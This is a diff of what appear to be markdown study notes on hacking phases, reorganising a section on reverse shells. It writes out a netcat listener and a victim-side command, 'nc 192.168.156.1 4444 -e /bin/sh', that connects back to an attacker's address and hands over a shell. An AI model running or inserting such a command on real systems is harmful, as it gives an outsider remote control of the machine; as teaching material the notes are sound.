@@ -123,12 +123,14 @@ Reverse shell is when the target connects to the attacker like this :
 ```bash
 # Attacker's machine
 nc -lvp 4444
-
+```
+> l for listening, v for verbose, p for port
+```
 # Victim's machine
 nc 192.168.156.1 4444 -e /bin/sh
 ```
-> l for listening, v for verbose, p for port
 > 192.168.156.1 is attacker's IP address
+> e 
 ## Gaining Access
 ## Maintaining Access
 ## Covering Tracks
@@ -136,11 +138,11 @@ nc 192.168.156.1 4444 -e /bin/sh
 Read:
 Darknet diaries
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEzNTg3MDcyNjksMTgxODE3NjIxOSwtMT
-A5Nzg5MTgxMywyMDU0MTcwODU0LDE1MzQ2OTIyNTQsLTM2MzE2
-MjAwOSw0OTI4OTEzNTQsLTE0OTgyMzEwMSwxODY1NjIyODEwLC
-0yMDgxNDYzMjE0LC0xMDE4MzYyNjcsLTQ3NDk5MDk4OCwtMTQ3
-MzExNTM2LC0xMjQ0MTk3Mjk4LDc2Mjc4MjE2MiwtMTgzMTMzOT
-g5LDQ2MjAyNjY3NSwtMTE3Njk1NzY5MywtMTAwNzUxMjIwOCwt
-NTMzNzI2ODUxXX0=
+eyJoaXN0b3J5IjpbLTU0MjY2MDk5OCwxODE4MTc2MjE5LC0xMD
+k3ODkxODEzLDIwNTQxNzA4NTQsMTUzNDY5MjI1NCwtMzYzMTYy
+MDA5LDQ5Mjg5MTM1NCwtMTQ5ODIzMTAxLDE4NjU2MjI4MTAsLT
+IwODE0NjMyMTQsLTEwMTgzNjI2NywtNDc0OTkwOTg4LC0xNDcz
+MTE1MzYsLTEyNDQxOTcyOTgsNzYyNzgyMTYyLC0xODMxMzM5OD
+ksNDYyMDI2Njc1LC0xMTc2OTU3NjkzLC0xMDA3NTEyMjA4LC01
+MzM3MjY4NTFdfQ==
 -->
